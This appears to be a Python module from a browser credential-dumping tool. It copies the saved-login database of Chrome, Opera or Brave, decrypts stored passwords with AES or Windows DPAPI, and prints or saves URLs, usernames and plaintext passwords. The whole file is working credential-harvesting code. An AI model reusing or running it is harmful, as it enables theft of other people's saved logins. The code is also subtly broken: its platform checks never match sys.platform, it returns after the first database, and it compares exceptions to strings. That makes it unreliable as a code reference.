import getpass
import logging
import os
import shutil
import sqlite3
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Union, Any

from Crypto.Cipher import AES

from exceptions import Exit

if os.name == "nt":
    import win32crypt


class ChromeBase:
    def __init__(self, verbose: bool = False):
        """
        Main Chrome-based browser class.
        :param verbose: print output
        """

        self.verbose = verbose  # Set whether print the values or not
        self.available_browsers = ["chrome", "opera", "brave"]
        self.values = []

        #  Determine which platform you are on
        self.target_os = sys.platform

    @staticmethod
    def get_datetime(chromedate: Any) -> datetime:
        """Return a `datetime.datetime` object from a chrome-like format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_windows(self):
        """
        Override function for this Windows class
        """
        pass

    def get_linux(self):
        """
        Override function for this Linux class
        """
        pass

    @staticmethod
    def decrypt_windows_password(password, key) -> str:
        """Input an encrypted password and return a decrypted one.
        Windows method
        """
        try:
            # Get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # Generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # Decrypt password
            return cipher.decrypt(password)[:-16].decode()

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

            except:
                # Not handled error. Abort execution
                logging.error(f"Code {Exit.NOT_HANDLED}")
                raise Exit(Exit.NOT_HANDLED)

    @staticmethod
    def decrypt_linux_password(password, key) -> str:
        """Input an encrypted password and return a decrypted one.
        Linux method
        """
        try:
            iv = b' ' * 16  # Initialization vector
            password = password[3:]  # Delete the 3 first chars
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
            return cipher.decrypt(password).strip().decode('utf8')

        except Exception as E:
            logging.error(f"Code {Exit.NOT_HANDLED} Error: {E}")
            raise Exit(Exit.NOT_HANDLED)  # Not handled error. Abort execution

    def retrieve_database(self) -> list:
        """Retrieve all the information from the databases with encrypted values.
        """

        if self.target_os == "win32":
            temp_path = r"C:\Users\{}\AppData\Local\Temp".format(getpass.getuser())
            database_paths, keys = self.get_windows()

        elif self.target_os == "linux":
            temp_path = "/tmp"
            database_paths, keys = self.get_linux()

        else:
            raise Exit(Exit.OS_NOT_SUPPORTED)

        try:
            for database_path in database_paths:  # Iterate on each available database
                # Copy the file to the temp directory as the database will be locked if the browser is running
                filename = os.path.join(temp_path, "LoginData.db")
                shutil.copyfile(database_path, filename)

                db = sqlite3.connect(filename)  # Connect to database
                cursor = db.cursor()  # Initialize cursor for the connection
                # Get data from the database
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from "
                    "logins order by date_created")

                # Set default values. Some of the values from the database are not filled.
                creation_time = "unknown"
                last_time_used = "unknown"

                # Iterate over all the rows
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    encrypted_password = row[3]
                    date_created = row[4]
                    date_last_used = row[5]

                    key = keys[database_paths.index(database_path)]

                    # Decrypt password
                    if self.target_os == "Windows":
                        password = self.decrypt_windows_password(encrypted_password, key)

                    elif self.target_os == "Linux":
                        password = self.decrypt_linux_password(encrypted_password, key)

                    else:
                        password = ""

                    if date_created and date_created != 86400000000:
                        creation_time = str(self.__class__.get_datetime(date_created))

                    if date_last_used and date_last_used != 86400000000:
                        last_time_used = self.__class__.get_datetime(date_last_used)

                    # Append all values to list
                    self.values.append(dict(origin_url=origin_url,
                                            action_url=action_url,
                                            username=username,
                                            password=password,
                                            creation_time=creation_time,
                                            last_time_used=last_time_used))

                    if self.verbose:
                        if username or password:
                            print("Origin URL: \t{}".format(origin_url))
                            print("Action URL: \t{}".format(action_url))
                            print("Username: \t{}".format(username))
                            print("Password: \t{}".format(password))
                            print("Creation date: \t{}".format(creation_time))
                            print("Last Used: \t{}".format(last_time_used))
                            print('_' * 75)

                # Close connection to the database
                cursor.close()  # Close cursor
                db.close()  # Close db instance

                # Attempt to delete the temporal database copy
                try:
                    os.remove(filename)

                except OSError:  # Skip if the database can't be deleted.
                    logging.warning("Couldn't delete temp database")

                return self.values

        # Errors
        except Exception as E:
            if E == 'database is locked':
                logging.error('Make sure Google Chrome is not running in the background')
                raise Exit(Exit.DATABASE_IS_LOCKED)

            elif E == 'no such table: logins':
                logging.error('Something wrong with the database name')
                raise Exit(Exit.DATABASE_UNDEFINED_TABLE)

            elif E == 'unable to open database file':
                logging.error('Something wrong with the database path')
                raise Exit(Exit.DATABASE_NOT_FOUND)

            else:
                # Not handled error. Abort execution.
                logging.error(f"Code {Exit.DATABASE_ERROR} Error: {E}")
                raise Exit(Exit.DATABASE_ERROR)

    def pretty_print(self) -> str:
        """
        Return the pretty-printed values
        """
        o = ""
        for dict_ in self.values:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += '-' * 50 + '\n'
        return o

    def save(self, filename: Union[Path, str]) -> None:
        """Save all the values to a desired path
        :param filename: the filename (including the path to dst)
        :return: None
        """
        with open(filename, 'w') as file:
            file.write(self.pretty_print())
